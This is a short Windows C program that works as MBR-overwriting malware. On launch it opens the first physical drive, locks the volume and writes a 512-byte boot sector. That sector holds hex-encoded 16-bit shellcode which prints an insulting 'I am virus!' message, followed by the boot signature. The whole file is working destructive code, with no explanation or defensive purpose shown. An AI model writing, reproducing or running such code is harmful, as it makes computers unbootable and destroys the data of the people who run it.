#include <Windows.h>
#include <winioctl.h>
#include <stdio.h>

unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

DWORD WriteMBR()
{
	DWORD dwBytesReturned;
	BYTE pMBR[512] = { 0 };
	
	memcpy(pMBR, scode, sizeof(scode));
	pMBR[510] = 0x55;
	pMBR[511] = 0xaa;

	HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		OutputDebugStringA("Oops, Failed!");
		return -1;
	}

	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	WriteFile(hDevice, pMBR, 512, &dwBytesReturned, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

	CloseHandle(hDevice);
	return 0;
}

int APIENTRY WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInst,
	LPSTR pszCmdLine,
	int nCmdShow
)
{
	WriteMBR();

	return 0;
}